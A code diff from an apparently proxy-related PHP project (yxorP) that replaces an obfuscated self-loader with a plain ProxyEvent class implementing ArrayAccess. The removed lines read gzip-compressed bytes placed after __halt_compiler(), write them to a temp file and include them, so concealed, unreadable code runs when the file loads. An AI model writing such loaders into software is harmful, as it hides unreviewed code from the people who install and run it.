@@ -1,2 +1,45 @@
-<?php $f=fopen(__FILE__,'r');fseek($f,__COMPILER_HALT_OFFSET__);$t=tmpfile();$u=stream_get_meta_data($t)['uri'];fwrite($t,gzinflate(stream_get_contents($f)));include($u);fclose($t);__halt_compiler();µQÍKÃ0¿ú?<p‡µ(»;uz~àaŽ‘ÅWÈ’—ŒÙÿnÓv¶¬e1‡ò~ï÷ÞÍÄlŒRÈ÷ÚÎ!ÅQ)¶E2Œcõûñäœ‡‚'„©µ,ŸrŽDãêç·ê57ø.¤|Ø0õ…%|”¦q)Ü«Z—d|2ÇB¥pã’ÁÜê}>Û¡r ¶Fâ¶xQÛ*Ž¾BqŒ;æ°­Tz•5¿–‚CæwB+X­¸Vä¬çnX"á¶â“¤bÔ¢áÜFÐÕ];
-‡Êá¨±è‹ºìøê,#t/X¸VÏKì˜ôØ¸6¾"ƒ¡ •òRáIÒnì¤¹Å2´WÊÐP«8C«µûÙ'AûÍö‚ý6yk­egŽ¶¢¿§äoc}SÔ¶»F¯þÉ÷ñœkºwÞ“	„å¶Ý‹ë
+<?php /* yxorP */
+
+namespace yxorP\Http;
+
+use ArrayAccess;
+use ReturnTypeWillChange;
+
+/**
+ * @property array $data
+ */
+class ProxyEvent implements ArrayAccess
+{
+    private array $data;
+
+    public function __construct($data = array())
+    {
+        $this->data = $data;
+    }
+
+    #[ReturnTypeWillChange] public function offsetSet($offset, $value)
+    {
+
+        if (is_null($offset)) {
+            $this->data[] = $value;
+        } else {
+            $this->data[$offset] = $value;
+        }
+    }
+
+    public function offsetExists($offset): bool
+    {
+        return isset($this->data[$offset]);
+    }
+
+    #[ReturnTypeWillChange] public function offsetUnset($offset)
+    {
+        unset($this->data[$offset]);
+    }
+
+    #[ReturnTypeWillChange] public function offsetGet($offset)
+    {
+        return $this->data[$offset] ?? null;
+    }
+
+}
